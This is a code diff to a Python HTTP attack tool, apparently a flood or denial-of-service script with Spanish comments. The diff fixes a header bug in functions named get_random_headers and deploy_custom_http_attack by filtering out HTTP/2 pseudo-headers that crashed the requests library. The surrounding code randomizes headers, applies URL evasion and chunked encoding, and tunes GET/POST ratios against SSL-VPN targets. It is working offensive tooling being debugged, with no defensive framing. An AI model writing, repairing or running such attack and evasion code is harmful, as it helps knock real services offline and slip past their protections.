@@ -3626,12 +3626,14 @@ def get_random_headers() -> Dict[str, str]:
         if EVASION_TECHNIQUES.get("chunked_encoding") and random.random() < 0.2:
             headers["Transfer-Encoding"] = "chunked"
     
-    # Headers específicos para HTTP/2
-    if HTTP2_MULTIPLEXING:
-        headers[":method"] = random.choice(["GET", "POST", "HEAD"])
-        headers[":path"] = "/"
-        headers[":scheme"] = PROTOCOL
-        headers[":authority"] = DOMAIN if DOMAIN else ""
+    # Headers específicos para HTTP/2 (solo si realmente se usa HTTP/2)
+    # NOTA: requests usa HTTP/1.1 por defecto, estos pseudo-headers causan errores
+    # Se deshabilitan para evitar InvalidHeader errors
+    # if HTTP2_MULTIPLEXING:
+    #     headers[":method"] = random.choice(["GET", "POST", "HEAD"])
+    #     headers[":path"] = "/"
+    #     headers[":scheme"] = PROTOCOL
+    #     headers[":authority"] = DOMAIN if DOMAIN else ""
     
     # Agregar headers de navegador real adicionales
     if random.random() > 0.5:
@@ -4268,8 +4270,10 @@ def deploy_custom_http_attack():
                     # Aplicar técnicas de evasión a la URL
                     target_url = apply_url_evasion(target_url)
                     
-                    # Obtener headers con evasión
-                    request_headers = get_random_headers()
+                    # Obtener headers con evasión y filtrar pseudo-headers HTTP/2 inválidos
+                    request_headers_raw = get_random_headers()
+                    # Filtrar pseudo-headers HTTP/2 que no son válidos en HTTP/1.1 (requests usa HTTP/1.1)
+                    request_headers = {k: v for k, v in request_headers_raw.items() if not k.startswith(':')}
                     
                     # Alternar entre GET y POST con ratio optimizado
                     # Para SSL-VPN, usar más GET ya que POST puede ser rechazado
